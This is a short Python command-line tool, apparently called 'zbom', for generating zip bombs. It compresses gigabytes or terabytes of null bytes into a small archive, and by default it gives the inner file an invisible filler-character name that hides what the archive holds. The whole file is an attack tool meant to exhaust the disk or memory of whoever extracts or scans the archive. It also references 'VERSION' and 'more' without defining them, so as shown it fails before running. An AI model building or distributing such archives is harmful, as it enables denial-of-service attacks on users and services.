import time
from zipfile import ZipFile, ZIP_BZIP2, ZIP_LZMA, ZIP_DEFLATED
from argparse import ArgumentParser, RawTextHelpFormatter

COMPRESSION_METHODS = {"bzip2": ZIP_BZIP2, "lzma": ZIP_LZMA, "deflated": ZIP_DEFLATED}
data = lambda c,s,u: (c.encode() * (1024 * 1024 * 1024 * (1024 if u == "tb" else 1))) * s

SIZE = 10
UNIT = "gb"
METHOD = "bzip2"
LEVEL = 9
CHAR = "\x00"
FILENAME = "ㅤ"

parser = ArgumentParser(prog="zbom", description="Generate bomb zip files.", usage="%(prog)s [options]", formatter_class=RawTextHelpFormatter)
parser.add_argument("-s", "--size", help="Bomb size in gb/tb", dest="size", type=int, required=False, default=SIZE)
parser.add_argument("-u", "--unit", help="Bomb size unit gb or tb", dest="unit", type=str, required=False, default=UNIT, choices=["gb", "tb"])
parser.add_argument("-m", "--method", help="Compression method", dest="method", type=str, required=False, default=METHOD, choices=["bzip2", "lzma", "deflated"])
parser.add_argument("-l", "--level", help="Compression level", dest="level", type=int, required=False, default=LEVEL, choices=[i for i in range(1, 10)])
parser.add_argument("-c", "--char", help="Character used for the whole bomb bytes as a content", dest="char", type=str, required=False, default=CHAR)
parser.add_argument("-f", "--filename", help="The name of the inner file inside the zip file", dest="filename", type=str, required=False, default=FILENAME)
parser.add_argument("-V", action="version", help="Tool version", dest="version", version=f"%(prog)s {VERSION}")
parser.add_argument("output", type=str, help="Output zip file")
parser.epilog = more
args = parser.parse_args()

output = args.output
method = args.method
filename = args.filename
char = args.char
size = args.size
unit = args.unit
level = args.level

start = time.time()

try:
    with ZipFile(output, "w", compression=COMPRESSION_METHODS[method]) as zb:
        zb.writestr(zinfo_or_arcname=filename, data=data(c=char, s=size, u=unit), compresslevel=level)
except MemoryError as merror:
    exit(f"[-] You machine can't take it.\n"
         f"... {size}{unit} is so massive for your machine.")

print(f"TIME: {time.time() - start}")